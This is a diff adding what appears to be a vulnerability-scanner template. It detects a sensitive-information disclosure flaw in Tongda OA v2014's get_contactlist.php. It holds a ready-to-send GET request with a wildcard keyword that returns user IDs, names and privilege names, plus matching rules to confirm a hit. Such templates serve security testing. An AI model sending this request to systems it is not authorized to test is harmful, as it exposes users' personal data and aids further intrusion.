@@ -1,0 +1,26 @@
+id: tongda-contact-list-exposure
+brief:
+    title: Tongda OA v2014 Get Contactlistt - Sensitive Information Disclosure
+    by: SleepingBag945
+    level: medium
+    about: There is an information leakage vulnerability in the get_contactlist.php file of Tongda OA v2014. Attackers can obtain sensitive information through the vulnerability and conduct further attacks.
+    label:
+        - tongda
+        - oa
+        - exposure
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3'
+      signs:
+        - "on": word
+          has:
+            - 'user_uid":'
+            - 'user_name":'
+            - 'priv_name":'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
